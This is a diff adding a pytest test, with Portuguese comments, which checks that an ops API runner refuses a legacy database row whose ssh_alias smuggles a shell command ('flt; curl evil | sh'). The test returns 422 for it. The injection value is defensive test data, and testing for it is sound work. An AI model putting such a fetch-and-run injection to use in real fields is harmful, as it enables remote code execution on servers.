@@ -101,6 +101,30 @@ def test_destination_rejects_injection():
     assert client.post("/api/v1/ops/destinations", json=base).status_code == 200
 
 
+@pytest.mark.asyncio
+async def test_run_rejects_preexisting_malicious_row(db_session):
+    """Linha inserida DIRETO no DB (sem passar pelo Pydantic) com ssh_alias
+    malicioso deve ser recusada no boundary do runner → 422, sem rodar nada."""
+    dest = OpsDestination(
+        id="legacy-evil",
+        label="Legacy",
+        ssh_alias="flt; curl evil | sh",  # metachar — bypassou o write-path
+        remote_base="/root/project",
+        compose_file="docker-compose.alocalizai.yml",
+        front_api_url="https://core.x/v1/",
+        image_registry="ghcr.io/x",
+        image_tag="t",
+        enabled=True,
+    )
+    db_session.add(dest)
+    await db_session.commit()
+
+    client = TestClient(app)
+    r = client.post("/api/v1/ops/legacy-evil/run", json={"dry_run": False})
+    assert r.status_code == 422
+    assert "ssh_alias" in r.json()["detail"]["error"]
+
+
 def test_run_unknown_destination_404():
     client = TestClient(app)
     r = client.post("/api/v1/ops/naoexiste/run", json={"dry_run": True})
